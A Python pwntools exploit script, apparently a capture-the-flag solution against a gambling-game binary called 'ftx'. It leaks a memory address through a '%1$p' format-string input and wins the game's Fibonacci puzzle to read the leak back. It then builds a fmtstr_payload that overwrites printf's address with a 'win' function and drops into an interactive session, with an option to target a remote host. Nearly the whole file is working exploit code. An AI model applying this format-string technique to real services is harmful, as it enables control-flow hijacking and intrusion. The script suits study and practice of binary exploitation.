import math
from pwn import *


def is_fibonacci(num):
    def is_perfect_square(n):
        return int(math.sqrt(n)) ** 2 == n

    return is_perfect_square(5 * num * num + 4) or is_perfect_square(5 * num * num - 4)


def hextoint(hex):
    return int(hex, 16)


def gamble(debug=True):
    p.recvuntil(b"What will you do?")
    p.sendline(b"g\n")
    line = p.recvuntil(b"): ")
    try:
        decoded_line = line.decode('utf-8')
    except UnicodeDecodeError:
        decoded_line = line.decode('latin-1')

    max_value = float(decoded_line.split("max")[1].strip("(): "))
    bet_value = max_value / 2
    # print('bet_value: ', bet_value)
    p.sendline(str(bet_value).encode())
    #
    p.recvuntil(b"*** GAMBLE ***")
    p.recvline()

    options = []
    for i in range(10):
        if len(options) == 5:
            break
        line = p.recvline().decode()
        if ')' in line:
            num = int(line.split(')')[1].strip())
            # print('num: ', num)
            options.append(num)

    non_fib = None
    for num in options:
        if not is_fibonacci(num):
            non_fib = num
            break
    #
    if non_fib is not None:
        p.sendline(str(options.index(non_fib) + 1).encode())

    if debug:
        line = p.recvuntil(b"succubus.").decode()
        match = re.search(r'Well done, (.*?)!', line)
        if match:
            value = match.group(1).strip()
            print(f"line {line}\nExtracted value: {value}\n")
            return value
        return None


context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 4002)
elif args.HOST:
    p = process('./ftx')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ftx',
                  gdbscript='''
                  b *do_gamble+449
                  c
                  ''')

p.recvuntil(b"Hello friend, welcome to FTX. what's your handle?")
p.sendline(b"%1$p")
ret = gamble()
printf_addr = hextoint(ret) - 640
win_addr = printf_addr - 12351
print('printf_addr', hex(printf_addr))
print('win_addr', hex(win_addr))

payload = fmtstr_payload(offset=8, writes={
    printf_addr: win_addr
})

## got the offset = 8
# for i in range(10):
# # overwrite printf addr
#     p.sendlineafter('Press any key to continue...', b'\nc')
#     p.sendlineafter("what's your handle?", '%{}$p'.format(i + 1).encode())
#     gamble()

p.sendlineafter('Press any key to continue...', b'c')
p.sendlineafter('What will you do?', b'c')
print(payload)
p.sendlineafter("what's your handle?", payload)

gamble(False)

p.interactive()
